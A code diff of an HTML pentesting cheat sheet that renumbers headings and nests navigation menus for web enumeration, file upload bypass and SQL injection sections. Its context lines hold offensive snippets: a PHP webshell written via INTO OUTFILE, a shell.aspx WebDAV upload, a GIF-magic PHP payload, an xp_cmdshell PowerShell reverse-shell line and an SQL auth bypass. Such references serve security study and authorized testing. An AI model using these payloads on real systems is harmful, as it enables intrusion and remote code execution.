@@ -4017,7 +4017,7 @@ sudo nmap -sV -p [port] --script "http-vuln-cve2021-41773" [ip]</code></pre>
 
 <h3 id="web-applications-enumeration">4.1 Enumeration</h3>
 
-<h3 id="web-applications-fingerprinting">Fingerprinting</h3>
+<h3 id="web-applications-fingerprinting">4.1.1 Fingerprinting</h3>
               <ul><li>Identify the server, framework, and CMS before attempting exploits — knowing the stack lets you target version-specific CVEs and default credentials.</li></ul>
 
               <table class="custom-table">
@@ -4097,7 +4097,7 @@ curl -X OPTIONS http://[ip] -i</code></pre>
               <pre><code class="language-bash"># SSL certificate — CN, SANs, issuer
 openssl s_client -connect [ip]:443</code></pre>
 
-<h3 id="web-applications-directory-discovery">Directory &amp; File Discovery</h3>
+<h3 id="web-applications-directory-discovery">4.1.2 Directory &amp; File Discovery</h3>
               <ul><li>Brute-force paths not linked from the visible site — admin panels, backup files, and config files are routinely forgotten and left accessible.</li></ul>
 
               <table class="custom-table">
@@ -4189,7 +4189,7 @@ wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.tx
 wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.[domain]" [domain]
 wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://[ip]/FUZZ</code></pre>
 
-<h3 id="web-applications-exposed-git">Exposed .git Directory</h3>
+<h3 id="web-applications-exposed-git">4.1.3 Exposed .git Directory</h3>
               <ul><li>An exposed <code>.git/</code> directory allows full source-code reconstruction, revealing credentials, internal paths, and application logic not visible from the running app.</li></ul>
 
               <pre><code class="language-bash"># git-dumper — download and reconstruct an exposed .git repo
@@ -4212,7 +4212,7 @@ sudo wget -r http://[ip]/.git/
 cd [ip]
 sudo git show</code></pre>
 
-<h3 id="web-applications-cms-scanning">CMS Scanning</h3>
+<h3 id="web-applications-cms-scanning">4.1.4 CMS Scanning</h3>
               <ul><li>CMS platforms have large plugin/theme ecosystems; a single outdated plugin frequently provides unauthenticated RCE or file-upload vulnerabilities.</li></ul>
 
               <pre><code class="language-bash"># wpscan — WordPress enumeration and brute force
@@ -4236,7 +4236,7 @@ cewl -w wordlist.txt "http://[ip]/" --with-numbers
 # expand wordlist with mutation rules
 john --wordlist=wordlist.txt --rules --stdout &gt; wordlist-modified.txt</code></pre>
 
-<h3 id="web-applications-webdav">WebDAV</h3>
+<h3 id="web-applications-webdav">4.1.5 WebDAV</h3>
               <ul><li>WebDAV extends HTTP with file-management methods (PUT, MOVE, DELETE); when enabled with weak credentials on IIS, it allows direct file upload to a web shell.</li></ul>
 
               <pre><code class="language-bash"># nmap — confirm WebDAV is enabled and list allowed methods
@@ -4259,7 +4259,7 @@ nc -nvlp 80
               <pre><code class="language-bash"># MOVE bypass — upload as .txt, rename to .aspx
 curl -X MOVE -H "Destination: http://[ip]/shell.aspx" http://[ip]/shell.txt -u [user]:[pass]</code></pre>
 
-<h3 id="web-applications-api-enumeration">API Enumeration</h3>
+<h3 id="web-applications-api-enumeration">4.1.6 API Enumeration</h3>
               <ul><li>REST APIs are often less hardened than the main UI — they may expose endpoints lacking authentication, accept predictable IDs, or return verbose errors confirming valid usernames.</li></ul>
 
               <pre><code class="language-bash"># Probe API root and resources
@@ -4608,7 +4608,7 @@ echo &quot;shell.jpg$ext$char&quot; &gt;&gt; wordlist.txt
 done
 done</code></pre>
 
-<h3 id="web-applications-file-upload-mime-spoofing">3.4.4.5 MIME Type Spoofing</h3>
+<h3 id="web-applications-file-upload-mime-spoofing">4.4.4.5 MIME Type Spoofing</h3>
               <ul><li>Prepend GIF magic bytes (<code>GIF8</code> or <code>GIF89a</code>) to fool <code>mime_content_type()</code> / <code>finfo</code> checks; GIF is preferred because its signature is printable ASCII.</li></ul>
               <pre><code class="language-php"># GIF magic bytes + PHP payload
 GIF89a;
@@ -4788,7 +4788,7 @@ EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClie
 
 <h3 id="web-applications-sql-injection">4.5.2 SQL Injection</h3>
 
-<h3 id="web-applications-sql-injection-functions">4.5.2.1–3 Common Functions, Error-Based &amp; UNION-Based Payloads</h3>
+<h3 id="web-applications-sql-injection-functions">4.5.2.1 Common Functions &amp; Payloads</h3>
 
               <table class="custom-table">
               <thead>
@@ -4887,7 +4887,7 @@ http://website.com/index.php?id=-1' UNION SELECT &lt;column1&gt;, &lt;column2&gt
 # When comments are blocked
 http://website.com/index.php?id=1' &lt;SQL_injection_here&gt; AND '1' -- -</code></pre>
 
-<h3 id="web-applications-blind-payloads">3.5.2.4 Blind Payloads</h3>
+<h3 id="web-applications-blind-payloads">4.5.2.4 Blind Payloads</h3>
               <ul><li>Blind SQL injection infers state via boolean page differences or deliberate delays; the wfuzz loops below automate char-by-char extraction.</li></ul>
               <ul>
               <li>Prefer boolean-based over time-based whenever a visible page difference exists — time-based is noisy and prone to false positives from network jitter.</li>
@@ -4980,7 +4980,7 @@ username=admin++++++++&amp;password=testpwn123</code></pre>
 
 <h3 id="web-applications-specific-databases">4.5.4 Specific Databases</h3>
 
-<h3 id="web-applications-mssql">3.5.4.1 MSSQL</h3>
+<h3 id="web-applications-mssql">4.5.4.1 MSSQL</h3>
               <ul><li>MSSQL's <code>xp_cmdshell</code> and <code>EXECUTE AS LOGIN</code> impersonation make it a high-value target once SQL injection is confirmed.</li></ul>
               <ul><li>Default system databases: <code>master</code>, <code>msdb</code>, <code>model</code>, <code>resource</code>, <code>tempdb</code>.</li></ul>
               <pre><code class="language-sql">-- Recon
@@ -5036,7 +5036,7 @@ RECONFIGURE;</code></pre>
 
               <ul><li>Extra references: <a href="https://www.tarlogic.com/blog/red-team-tales-0x01/" target="_blank" rel="noopener noreferrer">From MSSQL Injection to RCE</a> | <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings MSSQL Injection</a> | <a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/" target="_blank" rel="noopener noreferrer">MSSQL Practical Injection Cheat Sheet</a></li></ul>
 
-<h3 id="web-applications-mysql">3.5.4.2 MySQL</h3>
+<h3 id="web-applications-mysql">4.5.4.2 MySQL</h3>
               <ul><li>MySQL RCE relies on writing a PHP webshell via <code>INTO OUTFILE</code> when the DB user has <code>FILE</code> privilege and the web root is writable; check <code>SELECT @@secure_file_priv</code> first.</li></ul>
               <ul><li>Default system databases: <code>mysql</code>, <code>information_schema</code>, <code>performance_schema</code>, <code>sys</code>.</li></ul>
               <pre><code class="language-bash">mysql -u &lt;username&gt; -p'&lt;password&gt;' -h &lt;host&gt; -P &lt;port&gt;</code></pre>
@@ -5069,7 +5069,7 @@ SELECT "&lt;?php system($_GET['cmd']);?&gt;" INTO OUTFILE "C:\\xampp\\htdocs\\ba
 
               <ul><li>Extra references: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings MySQL Injection</a></li></ul>
 
-<h3 id="web-applications-mariadb">3.5.4.3 MariaDB</h3>
+<h3 id="web-applications-mariadb">4.5.4.3 MariaDB</h3>
               <ul><li>MariaDB shares MySQL's SQL dialect and <code>information_schema</code> structure; all MySQL UNION, error-based, and blind payloads apply without modification.</li></ul>
               <pre><code class="language-sql">-- Authentication bypass
 admin ' OR 1=1 --
@@ -5083,7 +5083,7 @@ admin ' OR 1=1 --
 
               <ul><li>Extra references: <a href="https://github.com/whatbe/nmap-scripts/blob/master/mariadb.mysqldump" target="_blank" rel="noopener noreferrer">MariaDB SQL Injection Example</a></li></ul>
 
-<h3 id="web-applications-oracle">3.5.4.4 Oracle</h3>
+<h3 id="web-applications-oracle">4.5.4.4 Oracle</h3>
               <ul><li>Oracle requires <code>FROM dual</code> in UNION SELECT statements and uses <code>all_users</code>, <code>all_tables</code>, and <code>all_tab_columns</code> in place of <code>information_schema</code>; use <code>--</code> for comments, not <code>#</code>.</li></ul>
 
               <!-- XSS types reference table -->
@@ -13800,23 +13800,23 @@ dir /b/s "&lt;FILE&gt;"</code></pre>
         <div class="nested-dropdown-container">
           <a href="#methodology-services-initial-scanning">1.1.1 Initial Scanning</a>
           <a href="#methodology-services-general-methodology">1.1.2 General Methodology</a>
-        </div>
-        <button class="dropdown-btn">1.1.3 Specific Services Strategy
-          <i class="bi bi-caret-down-fill"></i>
-        </button>
-        <div class="nested-dropdown-container">
-          <a href="#methodology-services-ftp">1.1.3.1 FTP (with Null Session)</a>
-          <a href="#methodology-services-smtp">1.1.3.2 SMTP</a>
-          <a href="#methodology-services-dns">1.1.3.3 DNS</a>
-          <a href="#methodology-services-kerberos">1.1.3.4 Kerberos</a>
-          <a href="#methodology-services-pop3">1.1.3.5 POP3</a>
-          <a href="#methodology-services-rpc">1.1.3.6 RPC (with Null Session)</a>
-          <a href="#methodology-services-smb">1.1.3.7 SMB (with Null Session)</a>
-          <a href="#methodology-services-snmp">1.1.3.8 SNMP</a>
-          <a href="#methodology-services-ldap">1.1.3.9 LDAP (with Null Session)</a>
-          <a href="#methodology-services-redis">1.1.3.10 Redis (with Null Session)</a>
-          <a href="#methodology-services-rsync">1.1.3.11 Rsync (with Null Session)</a>
-          <a href="#methodology-services-irc">1.1.3.12 IRC</a>
+          <button class="dropdown-btn">1.1.3 Specific Services Strategy
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+            <a href="#methodology-services-ftp">1.1.3.1 FTP (with Null Session)</a>
+            <a href="#methodology-services-smtp">1.1.3.2 SMTP</a>
+            <a href="#methodology-services-dns">1.1.3.3 DNS</a>
+            <a href="#methodology-services-kerberos">1.1.3.4 Kerberos</a>
+            <a href="#methodology-services-pop3">1.1.3.5 POP3</a>
+            <a href="#methodology-services-rpc">1.1.3.6 RPC (with Null Session)</a>
+            <a href="#methodology-services-smb">1.1.3.7 SMB (with Null Session)</a>
+            <a href="#methodology-services-snmp">1.1.3.8 SNMP</a>
+            <a href="#methodology-services-ldap">1.1.3.9 LDAP (with Null Session)</a>
+            <a href="#methodology-services-redis">1.1.3.10 Redis (with Null Session)</a>
+            <a href="#methodology-services-rsync">1.1.3.11 Rsync (with Null Session)</a>
+            <a href="#methodology-services-irc">1.1.3.12 IRC</a>
+          </div>
         </div>
         <button class="dropdown-btn">1.2 Web
           <i class="bi bi-caret-down-fill"></i>
@@ -13908,13 +13908,17 @@ dir /b/s "&lt;FILE&gt;"</code></pre>
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#web-applications-enumeration">4.1 Enumeration</a>
-        <a href="#web-applications-fingerprinting">Fingerprinting</a>
-        <a href="#web-applications-directory-discovery">Directory & File Discovery</a>
-        <a href="#web-applications-exposed-git">Exposed .git Directory</a>
-        <a href="#web-applications-cms-scanning">CMS Scanning</a>
-        <a href="#web-applications-webdav">WebDAV</a>
-        <a href="#web-applications-api-enumeration">API Enumeration</a>
+        <button class="dropdown-btn">4.1 Enumeration
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+          <a href="#web-applications-fingerprinting">4.1.1 Fingerprinting</a>
+          <a href="#web-applications-directory-discovery">4.1.2 Directory & File Discovery</a>
+          <a href="#web-applications-exposed-git">4.1.3 Exposed .git Directory</a>
+          <a href="#web-applications-cms-scanning">4.1.4 CMS Scanning</a>
+          <a href="#web-applications-webdav">4.1.5 WebDAV</a>
+          <a href="#web-applications-api-enumeration">4.1.6 API Enumeration</a>
+        </div>
         <button class="dropdown-btn">4.2 Directory Traversal & File Inclusion
           <i class="bi bi-caret-down-fill"></i>
         </button>
@@ -13931,27 +13935,39 @@ dir /b/s "&lt;FILE&gt;"</code></pre>
           <a href="#web-applications-file-upload-disabling-frontend-validation">4.4.1 Disabling Frontend Validation</a>
           <a href="#web-applications-file-upload-extensions-blacklist">4.4.2 Extensions Blacklist Bypass</a>
           <a href="#web-applications-file-upload-extensions-whitelist">4.4.3 Extensions Whitelist Bypass</a>
-          <a href="#web-applications-file-upload-bypassing-filters">4.4.4 Bypassing Filters</a>
-        </div>
-        <a href="#web-applications-file-upload-mime-spoofing">3.4.4.5 MIME Type Spoofing</a>
+          <button class="dropdown-btn">4.4.4 Bypassing Filters
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+            <a href="#web-applications-file-upload-mime-spoofing">4.4.4.5 MIME Type Spoofing</a>
+          </div>
           <a href="#web-applications-file-upload-file-execution">4.4.5 File Execution</a>
           <a href="#web-applications-file-upload-embed-code-into-images">4.4.6 Embed Code into Images</a>
           <a href="#web-applications-file-upload-embed-code-into-file-names">4.4.7 Embed Code into File Names</a>
+        </div>
         <button class="dropdown-btn">4.5 SQL Attacks
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
           <a href="#web-applications-tools-for-connecting-usage">4.5.1 Tools for Connecting Usage</a>
-          <a href="#web-applications-sql-injection">4.5.2 SQL Injection</a>
-        </div>
-        <a href="#web-applications-sql-injection-functions">4.5.2.1–3 Common Functions, Error-Based & UNION-Based Payloads</a>
-        <a href="#web-applications-blind-payloads">3.5.2.4 Blind Payloads</a>
+          <button class="dropdown-btn">4.5.2 SQL Injection
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+            <a href="#web-applications-sql-injection-functions">4.5.2.1 Common Functions & Payloads</a>
+            <a href="#web-applications-blind-payloads">4.5.2.4 Blind Payloads</a>
+          </div>
           <a href="#web-applications-sql-truncation">4.5.3 SQL Truncation</a>
-          <a href="#web-applications-specific-databases">4.5.4 Specific Databases</a>
-        <a href="#web-applications-mssql">3.5.4.1 MSSQL</a>
-        <a href="#web-applications-mysql">3.5.4.2 MySQL</a>
-        <a href="#web-applications-mariadb">3.5.4.3 MariaDB</a>
-        <a href="#web-applications-oracle">3.5.4.4 Oracle</a>
+          <button class="dropdown-btn">4.5.4 Specific Databases
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+            <a href="#web-applications-mssql">4.5.4.1 MSSQL</a>
+            <a href="#web-applications-mysql">4.5.4.2 MySQL</a>
+            <a href="#web-applications-mariadb">4.5.4.3 MariaDB</a>
+            <a href="#web-applications-oracle">4.5.4.4 Oracle</a>
+          </div>
+        </div>
         <a href="#web-applications-xxe-injection">4.6 XXE (XML External Entity) Injection</a>
         <a href="#web-applications-idor">4.7 IDOR (Insecure Direct Object References)</a>
         <a href="#web-applications-command-injections">4.8 Command Injections</a>
@@ -13994,7 +14010,7 @@ dir /b/s "&lt;FILE&gt;"</code></pre>
         <a href="#exploit-dev-fixing">6.3 Fixing a Broken PoC</a>
         <a href="#exploit-dev-bof">6.4 Stack Buffer Overflow Walkthrough</a>
         <a href="#exploit-dev-shellcode">6.5 Shellcode Generation & Encoding</a>
-        <a href="#exploit-dev-mitigations">6.6 Modern Mitigations You&rsquo;ll Run Into</a>
+        <a href="#exploit-dev-mitigations">6.6 Modern Mitigations You'll Run Into</a>
       </div>
     </div>
     <div class="section-flow-7">
